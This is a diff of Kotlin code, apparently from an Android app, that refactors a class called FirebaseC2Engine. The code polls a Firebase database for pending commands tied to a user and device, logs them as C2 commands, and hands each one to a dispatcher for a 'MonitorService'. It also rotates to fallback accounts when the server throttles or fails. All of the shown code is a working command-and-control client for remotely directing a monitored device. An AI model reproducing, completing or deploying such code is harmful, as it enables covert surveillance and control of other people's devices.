@@ -215,41 +215,37 @@ class FirebaseC2Engine(
                     val uid = if (currentUserId.isNotBlank()) currentUserId else "default_user"
                     val devId = if (currentDeviceId.isNotBlank()) currentDeviceId else getOrCreateDeviceId()
 
-                    val targetUids = listOf(uid).distinct()
+                    val url = "${account.databaseUrl}/users/$uid/devices/$devId/commands.json"
+                    val request = Request.Builder().url(url).get().build()
 
-                    for (targetUid in targetUids) {
-                        val url = "${account.databaseUrl}/users/$targetUid/devices/$devId/commands.json"
-                        val request = Request.Builder().url(url).get().build()
+                    httpClient.newCall(request).execute().use { response ->
+                        if (response.isSuccessful) {
+                            val body = response.body?.string() ?: "null"
+                            if (body != "null" && body.startsWith("{")) {
+                                val json = JSONObject(body)
+                                val keys = json.keys()
+                                while (keys.hasNext()) {
+                                    val cmdId = keys.next()
+                                    val cmdObj = json.optJSONObject(cmdId) ?: continue
+                                    val cmdText = cmdObj.optString("text", "")
+                                    val status = cmdObj.optString("status", "pending")
 
-                        httpClient.newCall(request).execute().use { response ->
-                            if (response.isSuccessful) {
-                                val body = response.body?.string() ?: "null"
-                                if (body != "null" && body.startsWith("{")) {
-                                    val json = JSONObject(body)
-                                    val keys = json.keys()
-                                    while (keys.hasNext()) {
-                                        val cmdId = keys.next()
-                                        val cmdObj = json.optJSONObject(cmdId) ?: continue
-                                        val cmdText = cmdObj.optString("text", "")
-                                        val status = cmdObj.optString("status", "pending")
+                                    if (status == "pending" && cmdText.isNotBlank()) {
+                                        Log.i(TAG, "Firebase C2 Received Command [$cmdId]: '$cmdText'")
 
-                                        if (status == "pending" && cmdText.isNotBlank()) {
-                                            Log.i(TAG, "Firebase C2 Received Command [$cmdId]: '$cmdText'")
+                                        // Mark as processing
+                                        updateCommandStatus(account, uid, devId, cmdId, "processing")
 
-                                            // Mark as processing
-                                            updateCommandStatus(account, targetUid, devId, cmdId, "processing")
+                                        // Dispatch to MonitorService
+                                        commandDispatcher(cmdText, "firebase_$cmdId")
 
-                                            // Dispatch to MonitorService
-                                            commandDispatcher(cmdText, "firebase_$cmdId")
-
-                                            // Mark as completed
-                                            updateCommandStatus(account, targetUid, devId, cmdId, "completed")
-                                        }
+                                        // Mark as completed
+                                        updateCommandStatus(account, uid, devId, cmdId, "completed")
                                     }
                                 }
-                            } else if (response.code == 429 || response.code >= 500) {
-                                rotateToNextFallbackAccount("HTTP ${response.code}")
                             }
+                        } else if (response.code == 429 || response.code >= 500) {
+                            rotateToNextFallbackAccount("HTTP ${response.code}")
                         }
                     }
                 } catch (e: Exception) {
